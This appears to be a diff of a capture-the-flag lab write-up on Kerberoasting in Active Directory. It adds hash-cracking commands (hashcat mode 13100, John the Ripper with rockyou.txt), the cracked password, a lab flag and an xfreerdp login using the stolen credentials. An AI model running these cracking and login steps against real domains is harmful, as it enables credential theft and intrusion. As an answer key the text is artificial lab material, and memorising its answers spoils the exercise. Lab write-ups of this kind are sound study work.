@@ -120,15 +120,39 @@ You should get a SPN ticket.
 
 <img src="./images/task3-hascat.png" height=400  width=auto>
 
+![task3-kerberoast](./images/task3-kerberoast.png)	
+
 Lets use hashcat to bruteforce this password. The type of hash we're cracking is **Kerberos 5 TGS-REP etype 23** and the hashcat code for this is **13100**.
 
 ```
 hashcat -m 13100 -a 0 hash.txt wordlist --force
 ```
 
-Crack the hash. What is the users password in plain text?
+* Crack the hash. What is the users password in plain text?
 
-Login as this user. What is his flag?
+	`rubenF124`
+
+	* Create `hast.txt`
+	
+		![task3-hash](./images/task3-hash.png)
+
+	* Crack the hash
+	
+		```
+		john --format=krb5tgs -w=/usr/share/wordlists/rockyou.txt hash.txt
+		```
+
+		![task3-john](./images/task3-john.png)
+
+* Login as this user. What is his flag?
+
+	`flag{bde1642535aa396d2439d86fe54a36e4}`
+
+	```
+	xfreerdp /v:10.10.81.175 /d:corp /u:fela /p:rubenF124 +clipboard
+	```
+
+	![task3-flag](./images/task3-flag.png)
 
 ## Task 4 - Privilege Escalation
 
